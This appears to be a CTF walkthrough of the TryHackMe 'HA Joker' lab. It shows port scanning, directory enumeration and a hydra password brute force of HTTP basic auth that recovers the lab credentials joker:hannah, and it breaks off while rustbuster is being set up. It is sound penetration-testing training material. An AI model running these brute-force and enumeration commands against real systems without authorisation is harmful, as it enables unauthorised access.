----
Batman hits Joker.
---

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/ed910d9d7c419b8266128e044a40c7e2.jpeg)
### HA Joker CTF

 Start Machine

We have developed this lab for the purpose of online penetration practices. Solving this lab is not that tough if you have proper basic knowledge of Penetration testing. Let’s start and learn how to breach it.

1.  **Enumerate Services**  
    _- Nmap  
    _
2.  **Bruteforce**_- Performing Bruteforce on files over http_  
    ___- Performing Bruteforce on Basic Authentication___
3.  **Hash Crack**_- Performing Bruteforce on hash to crack zip file  
    - Performing Bruteforce on hash to crack mysql user  
    _
4.  **Exploitation**_  
    - Getting a reverse connection  
    - Spawning a TTY Shell_
5.  **Privilege Escalation**  
    _- Get root taking advantage of flaws in LXD_  
    

Answer the questions below

```
┌──(witty㉿kali)-[~]
└─$ rustscan -a 10.10.230.190 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.230.190:22
Open 10.10.230.190:80
Open 10.10.230.190:8080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-10 13:03 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:03
Completed NSE at 13:03, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:03
Completed NSE at 13:03, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:03
Completed NSE at 13:03, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 13:03
Completed Parallel DNS resolution of 1 host. at 13:03, 0.02s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 13:03
Scanning 10.10.230.190 [3 ports]
Discovered open port 8080/tcp on 10.10.230.190
Discovered open port 22/tcp on 10.10.230.190
Discovered open port 80/tcp on 10.10.230.190
Completed Connect Scan at 13:03, 0.38s elapsed (3 total ports)
Initiating Service scan at 13:03
Scanning 3 services on 10.10.230.190
Completed Service scan at 13:03, 6.83s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.230.190.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:03
Completed NSE at 13:04, 11.35s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:04
Completed NSE at 13:04, 1.63s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:04
Completed NSE at 13:04, 0.00s elapsed
Nmap scan report for 10.10.230.190
Host is up, received user-set (0.37s latency).
Scanned at 2023-03-10 13:03:42 EST for 21s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ad201ff4331b0070b385cb8700c4f4f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL89x6yGLD8uQ9HgFK1nvBGpjT6KJXIwZZ56/pjgdRK/dOSpvl0ckMaa68V9bLHvn0Oerh2oa4Q5yCnwddrQnm7JHJ4gNAM+lg+ML7+cIULAHqXFKPpPAjvEWJ7T6+NRrLc9q8EixBsbEPuNer4tGGyUJXg6GpjWL5jZ79TwZ80ANcYPVGPZbrcCfx5yR/1KBTcpEdUsounHjpnpDS/i+2rJ3ua8IPUrqcY3GzlDcvF7d/+oO9GxQ0wjpy1po6lDJ/LytU6IPFZ1Gn/xpRsOxw0N35S7fDuhn69XlXj8xiDDbTlOhD4sNxckX0veXKpo6ynQh5t3yM5CxAQdqRKgFF
|   256 1bf9a8ecfd35ecfb04d5ee2aa17a4f78 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOzF9YUxQxzgUVsmwq9ZtROK9XiPOB0quHBIwbMQPScfnLbF3/Fws+Ffm/l0NV7aIua0W7FLGP3U4cxZEDFIzfQ=
|   256 dcd7dd6ef6711f8c2c2ca1346d299920 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPLWfYB8/GSsvhS7b9c6hpXJCO6p1RvLsv4RJMvN4B3r
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HA: Joker
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
8080/tcp open  http    syn-ack Apache httpd 2.4.29
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Please enter the password.
|_http-title: 401 Unauthorized
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:04
Completed NSE at 13:04, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:04
Completed NSE at 13:04, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:04
Completed NSE at 13:04, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.72 seconds


<!--You can't win anyway... You see, I hold the winning card!-->
<!DOCTYPE html>
<!--"I won't even waste the usual Joker Venom on you, Brute, but give you something you can understand...lead!-->
<html>
<!--Very neat! That ugly head of yours does have a brain!-->
<title>HA: Joker</title>
<!--I'm not mad at all! I'm just differently sane!!-->
<meta charset="UTF-8">
<!--More powerful than a locomotive, and just about as subtle-->
<meta name="viewport" content="width=device-width, initial-scale=1">
<!--One by One, they'll hear my call. Then this wicked town, will follow my fall.-->
<link rel="stylesheet" href="css/w3.css">
<!--It's a clear choice me or Pettit. Vote or die. Cancer or tuberculosis.-->
<link rel="stylesheet" href="css/font.css">
<!--If I weren't crazy, I'd be insane!-->
<style>
<!--You dirty rat! You killed my brother! My sister! My daughter! She's my sister and my daughter!-->
body,h1 {font-family: "Raleway", Arial, sans-serif}
<!--Quick question: When the clock strikes twelve, do I get a little kiss?-->
h1 {letter-spacing: 6px}
<!--Hello Late-Show lovers...and lovers of the Late-Show!-->
.w3-row-padding img {margin-bottom: 12px}
<!--Live...and in person! The Caliph of Clowns, the Grand Mogul of Mountebanks, the One and Only JOKER! Prerecorded for this time zone.-->
</style>
<!--Every clown loves kids, captain. Just ask Sarah Essen-Gordon. Oh, that's right, you can't!-->
<body>
<!--If the police expect to play against the Joker, they'd better be prepared to be dealt from the bottom of the deck! -->
<div class="w3-content" style="max-width:1500px">
<!--If I weren't insane: I couldn't be so brilliant!-->
<header class="w3-panel w3-center w3-opacity">
<!--You can't kill me without becoming like me! I can't kill you without losing the only human being who can keep up with me! Isn't it IRONIC?-->
 <img src="img/100.jpg" style="width:100%">
<!--The real joke is your stubborn, bone deep conviction that somehow, somewhere, all of this makes sense! That's what cracks me up each time!-->
 <h1>HA: JOKER</h1>
 <!--Devil is double is deuce, my dear doctor ... and joker trumps deuce.-->
</header>
<!--You fell for the old fake Joker gag, Batman! You left me to die!-->
<div class="w3-row-padding w3-grayscale" style="margin-bottom:128px">
  <!--I've killed your girlfriend, poisoned Gotham, and hell... it's not even breakfast! But so what? We all know you'll save me.-->
  <div class="w3-half">
    <!--Get out of the way, Bats! I've got a date with immortality!-->
	<img src="img/1.png" style="width:100%">
	<!--Hurry! Batman's just had his way with one of you! Now that's a spicy meat-a-ball!-->
	<img src="img/2.png" style="width:100%">
    <!--NOW THIS IS WHAT I CALL A PARTY!!-->
	<img src="img/3.png" style="width:100%">
    <!--Jingle bells, Batman smells, Gotham's quite a mess! Blackgate's mine and you're out of time, which means you'll soon be dead!-->
	<img src="img/4.png" style="width:100%">
    <!--Where, oh where has my little Bat gone? Oh where, oh where can he be? His cowl, his scowl, his temper so foul. I do hope he's coming for me.-->
	<img src="img/5.png" style="width:100%">
    <!--Well, I'd love to stay and celebrate your victory, but I've got stockings to stuff, mistletoe to hang - and about fifteen skyscrapers to blow up before sunrise. Ciao-->
	<img src="img/6.png" style="width:100%">
    <!--Who's gonna save Gotham now? Robin?!-->
	<img src="img/7.png" style="width:100%">
	<!--You can't win anyway... You see, I hold the winning card!-->
	<img src="img/8.png" style="width:100%">
	<!--All I have are negative thoughts.-->
	<img src="img/9.png" style="width:100%">
   	<!--I used to think that my life was a tragedy. But now I realize, it’s a comedy.-->
  </div>
<!--Smile, because it confuses people. Smile, because it's easier than explaining what is killing you inside.-->
  <div class="w3-half">
	<!--As you know, madness is like gravity...all it takes is a little push.-->
	<img src="img/10.png" style="width:100%">
<!--If you’re good at something, never do it for free.-->
	<img src="img/11.png" style="width:100%">
<!--Nobody panics when things go “according to plan”. Even if the plan is horrifying!-->
	<img src="img/12.png" style="width:100%">
<!--Introduce a little anarchy. Upset the established order, and everything becomes chaos. I'm an agent of chaos...-->
	<img src="img/13.png" style="width:100%">
<!--Oh I really look like a guy with a plan? You know what I am? I'm a dog chasing cars. I wouldn't know what to do with one if I caught it!-->
    <img src="img/14.png" style="width:100%">
<!--What doesn't kill you, simply makes you stranger!-->
	<img src="img/15.png" style="width:100%">
<!--Why so serious?-->
	<img src="img/16.png" style="width:100%">
<!--They Laugh At me Because I'm Different. I laugh At Then Because The're all the same-->
	<img src="img/17.png" style="width:100%">
<!--The only sensible way to live in this world is without rules.-->
    <img src="img/18.png" style="width:100%">
<!--Tell your men they work for me now, this is my city!-->
	  </div>
<!--I'm not gonna kill ya. I'm just gonna hurt ya... really, really bad. -->
</div>
  <!-- I wouldn't want you to break those perfect porcelain-capped teeth when the juice hits your brain.-->
</div>
<!--Stupid Bats, you're ruining date night! -->
<footer class="w3-container w3-padding-64 w3-light-grey w3-center w3-large">
<!--Are you sweet talkin' me? All'a that chitchat's gonna getcha hurt-->
  <p>Powered by <a href="https://hackingarticles.in" target="_blank" class="w3-hover-text-green">Hacking Articles</a></p>
<!--Twinkle, twinkle, little bat. Watch me kill your favorite cat.-->
</footer>
<!--Ha ha ha ha ha ha ha ha Its a good joke isn't-->
</body>
<!--I did it! I finally killed Batman! In front of a bunch of vulnerable, disabled, kids!!!! Now get me Santa Claus!-->
</html>

┌──(witty㉿kali)-[~]
└─$ gobuster -t 64 dir -e -k -u http://10.10.230.190/ -w /usr/share/dirb/wordlists/common.txt -x txt,php,html
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.230.190/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt,php,html
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/03/10 13:11:21 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.230.190/.htaccess.html       (Status: 403) [Size: 278]
http://10.10.230.190/.html                (Status: 403) [Size: 278]
http://10.10.230.190/.htpasswd            (Status: 403) [Size: 278]
http://10.10.230.190/.hta.html            (Status: 403) [Size: 278]
http://10.10.230.190/.htpasswd.html       (Status: 403) [Size: 278]
http://10.10.230.190/.htaccess.php        (Status: 403) [Size: 278]
http://10.10.230.190/.htaccess            (Status: 403) [Size: 278]
http://10.10.230.190/.hta.txt             (Status: 403) [Size: 278]
http://10.10.230.190/.htpasswd.php        (Status: 403) [Size: 278]
http://10.10.230.190/.php                 (Status: 403) [Size: 278]
http://10.10.230.190/.htaccess.txt        (Status: 403) [Size: 278]
http://10.10.230.190/.hta                 (Status: 403) [Size: 278]
http://10.10.230.190/.hta.php             (Status: 403) [Size: 278]
http://10.10.230.190/.htpasswd.txt        (Status: 403) [Size: 278]
http://10.10.230.190/css                  (Status: 301) [Size: 312] [--> http://10.10.230.190/css/]
http://10.10.230.190/img                  (Status: 301) [Size: 312] [--> http://10.10.230.190/img/]
http://10.10.230.190/index.html           (Status: 200) [Size: 5954]
http://10.10.230.190/index.html           (Status: 200) [Size: 5954]
http://10.10.230.190/phpinfo.php          (Status: 200) [Size: 94769]
http://10.10.230.190/phpinfo.php          (Status: 200) [Size: 94769]
http://10.10.230.190/secret.txt           (Status: 200) [Size: 320]
http://10.10.230.190/server-status        (Status: 403) [Size: 278]
Progress: 18456 / 18460 (99.98%)
===============================================================
2023/03/10 13:12:27 Finished
===============================================================

http://10.10.230.190/secret.txt

Batman hits Joker.
Joker: "Bats you may be a rock but you won't break me." (Laughs!)
Batman: "I will break you with this rock. You made a mistake now."
Joker: "This is one of your 100 poor jokes, when will you get a sense of humor bats! You are dumb as a rock."
Joker: "HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA!"

┌──(witty㉿kali)-[~]
└─$ hydra -l joker -P /usr/share/wordlists/rockyou.txt -s 8080 10.10.230.190 http-get -t 64
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-10 13:28:52
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-get://10.10.230.190:8080/
[8080][http-get] host: 10.10.230.190   login: joker   password: hannah
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-10 13:29:35

┌──(witty㉿kali)-[~]
└─$ nikto -host http://10.10.230.190:8080/ -id joker:hannah
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.230.190
+ Target Hostname:    10.10.230.190
+ Target Port:        8080
+ Start Time:         2023-03-10 13:33:40 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ / - Requires Authentication for realm ' Please enter the password.'
+ Successfully authenticated to realm ' Please enter the password.' with user-supplied credentials.
+ /robots.txt: Entry '/components/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/bin/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/modules/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/plugins/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/language/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/includes/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/cache/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/layouts/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/administrator/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/cli/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/tmp/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/libraries/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: contains 14 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ /backup.zip: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /: DEBUG HTTP verb may show server debugging information. See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-for-aspnet-applications?view=vs-2017
+ /web.config: Uncommon header 'tcn' found, with contents: choice.
+ /web.config: ASP config file is accessible.

http://10.10.230.190:8080/robots.txt

# If the Joomla site is installed within a folder 
# eg www.example.com/joomla/ then the robots.txt file 
# MUST be moved to the site root 
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths. 
# eg the Disallow rule for the /administrator/ folder MUST 
# be changed to read 
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/orig.html
#
# For syntax checking, see:
# http://tool.motoricerca.info/robots-checker.phtml

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/

joker:hannah

to base64  am9rZXI6aGFubmFo

┌──(witty㉿kali)-[~]
└─$ curl -s -H "Authorization: Basic am9rZXI6aGFubmFo" http://10.10.230.190:8080/robots.txt
# If the Joomla site is installed within a folder 
# eg www.example.com/joomla/ then the robots.txt file 
# MUST be moved to the site root 
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths. 
# eg the Disallow rule for the /administrator/ folder MUST 
# be changed to read 
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/orig.html
#
# For syntax checking, see:
# http://tool.motoricerca.info/robots-checker.phtml

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/

┌──(witty㉿kali)-[~]
└─$ gobuster dir -H "Authorization: Basic am9rZXI6aGFubmFo,Cookie: 5fef75b50575ebea33a28bd1e7087dcb=gq1c2tl4lq49h2rv2p7gfir6j2; 0d073d2ec68ac2f24f859831bbe8843b=1ecph8o40ul8om1nmk81vpd872" -u http://10.10.230.190:8080/ -x bak,old,tar,gz,tgz,zip,7z -w /usr/share/wordlists/dirb/common.txt -t 64
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.230.190:8080/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              tgz,zip,7z,bak,old,tar,gz
[+] Timeout:                 10s
===============================================================
2023/03/10 16:02:18 Starting gobuster in directory enumeration mode
===============================================================
/.hta.7z              (Status: 403) [Size: 280]
/.hta.zip             (Status: 403) [Size: 280]
/.hta                 (Status: 403) [Size: 280]
/.hta.bak             (Status: 403) [Size: 280]
/.hta.old             (Status: 403) [Size: 280]
/.hta.tgz             (Status: 403) [Size: 280]
/.hta.tar             (Status: 403) [Size: 280]
/.hta.gz              (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/.htaccess.zip        (Status: 403) [Size: 280]
/.htaccess.old        (Status: 403) [Size: 280]
/.htaccess.7z         (Status: 403) [Size: 280]
/.htaccess.gz         (Status: 403) [Size: 280]
/.htaccess.tgz        (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/.htaccess.tar        (Status: 403) [Size: 280]
/.htpasswd.7z         (Status: 403) [Size: 280]
/.htaccess.bak        (Status: 403) [Size: 280]
/.htpasswd.bak        (Status: 403) [Size: 280]
/.htpasswd.tar        (Status: 403) [Size: 280]
/.htpasswd.old        (Status: 403) [Size: 280]
/.htpasswd.gz         (Status: 403) [Size: 280]
/.htpasswd.tgz        (Status: 403) [Size: 280]
/.htpasswd.zip        (Status: 403) [Size: 280]
/administrator        (Status: 301) [Size: 329] [--> http://10.10.230.190:8080/administrator/]
/bin                  (Status: 301) [Size: 319] [--> http://10.10.230.190:8080/bin/]
/cache                (Status: 301) [Size: 321] [--> http://10.10.230.190:8080/cache/]
Progress: 7428 / 36920 (20.12%)[ERROR] 2023/03/10 16:02:46 [!] context deadline exceeded (Client.Timeout or context cancellation while reading body)
[ERROR] 2023/03/10 16:02:46 [!] context deadline exceeded (Client.Timeout or context cancellation while reading body)
/components           (Status: 301) [Size: 326] [--> http://10.10.230.190:8080/components/]
/images               (Status: 301) [Size: 322] [--> http://10.10.230.190:8080/images/]
/includes             (Status: 301) [Size: 324] [--> http://10.10.230.190:8080/includes/]
/index.php            (Status: 200) [Size: 10949]
Progress: 16474 / 36920 (44.62%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/03/10 16:03:16 Finished
===============================================================

let's use feroxbuster or maybe rustbuster

┌──(witty㉿kali)-[~]
└─$ feroxbuster -H "Authorization: Basic am9rZXI6aGFubmFo,Cookie: 5fef75b50575ebea33a28bd1e7087dcb=gq1c2tl4lq49h2rv2p7gfir6j2; 0d073d2ec68ac2f24f859831bbe8843b=1ecph8o40ul8om1nmk81vpd872" -u http://10.10.230.190:8080/ -x bak,old,tar,gz,tgz,zip,7z -w /usr/share/wordlists/dirb/common.txt -t 64 -q       
403      GET        9l       28w      280c http://10.10.230.190:8080/.hta
500      GET        1l        5w       31c http://10.10.230.190:8080/
403      GET        9l       28w      280c http://10.10.230.190:8080/.htpasswd
403      GET        9l       28w      280c http://10.10.230.190:8080/.htaccess
403      GET        9l       28w      280c http://10.10.230.190:8080/.hta.bak
403      GET        9l       28w      280c http://10.10.230.190:8080/.htpasswd.bak
403      GET        9l       28w      280c http://10.10.230.190:8080/.htaccess.bak
403      GET        9l       28w      280c http://10.10.230.190:8080/.hta.old
403      GET        9l       28w      280c http://10.10.230.190:8080/.htpasswd.old
403      GET        9l       28w      280c http://10.10.230.190:8080/.htaccess.old
403      GET        9l       28w      280c http://10.10.230.190:8080/.hta.tar
403      GET        9l       28w      280c http://10.10.230.190:8080/.htpasswd.tar
403      GET        9l       28w      280c http://10.10.230.190:8080/.htaccess.tar
403      GET        9l       28w      280c http://10.10.230.190:8080/.hta.gz
403      GET        9l       28w      280c http://10.10.230.190:8080/.htpasswd.gz
403      GET        9l       28w      280c http://10.10.230.190:8080/.htaccess.gz
403      GET        9l       28w      280c http://10.10.230.190:8080/.hta.tgz
403      GET        9l       28w      280c http://10.10.230.190:8080/.htpasswd.tgz
403      GET        9l       28w      280c http://10.10.230.190:8080/.htaccess.tgz
403      GET        9l       28w      280c http://10.10.230.190:8080/.htpasswd.zip
403      GET        9l       28w      280c http://10.10.230.190:8080/.htaccess.zip
403      GET        9l       28w      280c http://10.10.230.190:8080/.hta.zip
403      GET        9l       28w      280c http://10.10.230.190:8080/.htpasswd.7z
403      GET        9l       28w      280c http://10.10.230.190:8080/.htaccess.7z
403      GET        9l       28w      280c http://10.10.230.190:8080/.hta.7z
301      GET        9l       28w      329c http://10.10.230.190:8080/administrator => http://10.10.230.190:8080/administrator/
403      GET        9l       28w      280c http://10.10.230.190:8080/administrator/.hta
403      GET        9l       28w      280c http://10.10.230.190:8080/administrator/.htaccess
403      GET        9l       28w      280c http://10.10.230.190:8080/administrator/.htaccess.bak
403      GET        9l       28w      280c http://10.10.230.190:8080/administrator/.htaccess.old
403      GET        9l       28w      280c http://10.10.230.190:8080/administrator/.htaccess.tar
403      GET        9l       28w      280c http://10.10.230.190:8080/administrator/.htaccess.gz
403      GET        9l       28w      280c http://10.10.230.190:8080/administrator/.htaccess.tgz
403      GET        9l       28w      280c http://10.10.230.190:8080/administrator/.htaccess.zip
403      GET        9l       28w      280c http://10.10.230.190:8080/administrator/.htaccess.7z
403      GET        9l       28w      280c http://10.10.230.190:8080/administrator/.htpasswd
403      GET        9l       28w      280c http://10.10.230.190:8080/administrator/.htpasswd.bak
403      GET        9l       28w      280c http://10.10.230.190:8080/administrator/.htpasswd.old
403      GET        9l       28w      280c http://10.10.230.190:8080/administrator/.htpasswd.tar
403      GET        9l       28w      280c http://10.10.230.190:8080/administrator/.htpasswd.gz
403      GET        9l       28w      280c http://10.10.230.190:8080/administrator/.htpasswd.tgz
403      GET        9l       28w      280c http://10.10.230.190:8080/administrator/.htpasswd.zip
403      GET        9l       28w      280c http://10.10.230.190:8080/administrator/.htpasswd.7z
403      GET        9l       28w      280c http://10.10.230.190:8080/administrator/.hta.bak
403      GET        9l       28w      280c http://10.10.230.190:8080/administrator/.hta.old
403      GET        9l       28w      280c http://10.10.230.190:8080/administrator/.hta.tar
403      GET        9l       28w      280c http://10.10.230.190:8080/administrator/.hta.gz
403      GET        9l       28w      280c http://10.10.230.190:8080/administrator/.hta.tgz
403      GET        9l       28w      280c http://10.10.230.190:8080/administrator/.hta.zip
403      GET        9l       28w      280c http://10.10.230.190:8080/administrator/.hta.7z
301      GET        9l       28w      319c http://10.10.230.190:8080/bin => http://10.10.230.190:8080/bin/
403      GET        9l       28w      280c http://10.10.230.190:8080/bin/.htaccess
403      GET        9l       28w      280c http://10.10.230.190:8080/bin/.htaccess.bak
403      GET        9l       28w      280c http://10.10.230.190:8080/bin/.htaccess.old
403      GET        9l       28w      280c http://10.10.230.190:8080/bin/.hta
403      GET        9l       28w      280c http://10.10.230.190:8080/bin/.htaccess.tar
403      GET        9l       28w      280c http://10.10.230.190:8080/bin/.hta.bak
403      GET        9l       28w      280c http://10.10.230.190:8080/bin/.htaccess.gz
403      GET        9l       28w      280c http://10.10.230.190:8080/bin/.hta.old
403      GET        9l       28w      280c http://10.10.230.190:8080/bin/.htaccess.tgz
403      GET        9l       28w      280c http://10.10.230.190:8080/bin/.hta.tar
403      GET        9l       28w      280c http://10.10.230.190:8080/bin/.htaccess.zip
403      GET        9l       28w      280c http://10.10.230.190:8080/bin/.hta.gz
403      GET        9l       28w      280c http://10.10.230.190:8080/bin/.htaccess.7z
403      GET        9l       28w      280c http://10.10.230.190:8080/bin/.hta.tgz
403      GET        9l       28w      280c http://10.10.230.190:8080/bin/.hta.zip
301      GET        9l       28w      321c http://10.10.230.190:8080/cache => http://10.10.230.190:8080/cache/
403      GET        9l       28w      280c http://10.10.230.190:8080/bin/.hta.7z
403      GET        9l       28w      280c http://10.10.230.190:8080/bin/.htpasswd
403      GET        9l       28w      280c http://10.10.230.190:8080/cache/.hta
403      GET        9l       28w      280c http://10.10.230.190:8080/cache/.htaccess
403      GET        9l       28w      280c http://10.10.230.190:8080/cache/.htpasswd
200      GET        0l        0w 12133560c http://10.10.230.190:8080/backup
200      GET        0l        0w 12133560c http://10.10.230.190:8080/backup.zip
301      GET        9l       28w      326c http://10.10.230.190:8080/components => http://10.10.230.190:8080/components/
403      GET        9l       28w      280c http://10.10.230.190:8080/components/.htpasswd
403      GET        9l       28w      280c http://10.10.230.190:8080/components/.htpasswd.bak
403      GET        9l       28w      280c http://10.10.230.190:8080/components/.htpasswd.old
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_10_230_190:8080_-1678483133.state ...
Scanning: http://10.10.230.190:8080/
Scanning: http://10.10.230.190:8080/administrator/
Scanning: http://10.10.230.190:8080/bin/
Scanning: http://10.10.230.190:8080/cache/
Scanning: http://10.10.230.190:8080/components/

https://github.com/phra/rustbuster
                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ chmod +x rustbuster-v3.0.3-x86_64-unknown-linux-gnu

                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ ./rustbuster-v3.0.3-x86_64-unknown-linux-gnu -h

./rustbuster-v3.0.3-x86_64-unknown-linux-gnu: error while loading shared libraries: libssl.so.1.1: cannot open shared object file: No such file or directory
                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ sudo apt-get install libssl1.1


                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ ./rustbuster-v3.0.3-x86_64-unknown-linux-gnu -h

rustbuster 3.0.3
by phra & ps1dr3x
DirBuster for rust

USAGE:
    rustbuster-v3.0.3-x86_64-unknown-linux-gnu [SUBCOMMAND]

FLAGS:
    -h, --help       Prints help information
    -V, --version    Prints version information

SUBCOMMANDS:
    dir      Directories and files enumeration mode
    dns      A/AAAA entries enumeration mode
    fuzz     Custom fuzzing enumeration mode
    help     Prints this message or the help of the given subcommand(s)
    tilde    IIS 8.3 shortname enumeration mode
    vhost    Virtual hosts enumeration mode

EXAMPLES:
    1. Dir mode:
